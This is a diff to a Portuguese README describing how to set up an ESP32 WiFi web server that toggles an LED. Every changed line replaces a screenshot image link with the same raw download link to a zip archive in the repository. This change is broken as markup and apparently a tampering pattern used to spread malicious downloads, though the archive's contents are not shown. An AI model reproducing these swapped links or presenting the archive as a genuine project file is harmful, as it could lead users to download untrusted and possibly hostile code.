@@ -26,7 +26,7 @@
 <p>3° - No "Serial Monitor", aparecerá esses dados: </p>
 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/172730088-1a1e5a9e-3a28-4112-b978-34239941a696.PNG" width="300px" />
+<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
 </div> 
 
 <p>4° - Visualiza as redes Wifi's disponíveis. Aparecerá a rede "ESP32", na qual deverá ser logada pela senha: 123456789</p>
@@ -36,7 +36,7 @@
 <p>6° - Selecione a opção "Configure WiFi". Entre com a senha na rede WIFI de sua escolha. </p>
 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/172732731-df2451c1-3316-4631-99cb-97493e8365f0.PNG" width="300px" />
+<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
 </div>         
 
 <p>7° - Logue seu dispositivo na mesma rede WIFI colocada anterirmente. </p>
@@ -44,16 +44,16 @@
 <p>8° - O serial Monitor mostrará "Conectado IP". Copie e cole esse "IP: 192.168.0.27" acrescentado ":8090" no seu navegador </p>
 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/172732743-132191db-329f-44bc-997d-b54ea58090ee.PNG" width="300px" />
+<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
 </div> 
 
 <p>9° - Basta clicar no Botão "LED-OFF" ou "LED-ON", os nomes representam o estado atual do LED. </p>
 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/172733233-31d9390f-a196-4a64-a0aa-42392777a0b3.PNG" width="300px" />
+<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
 </div> 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/172733243-b9aa6e9c-a1f6-45da-ac7c-bcb6d8454b54.PNG" width="300px" />
+<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
 </div> 
 
 # Observações
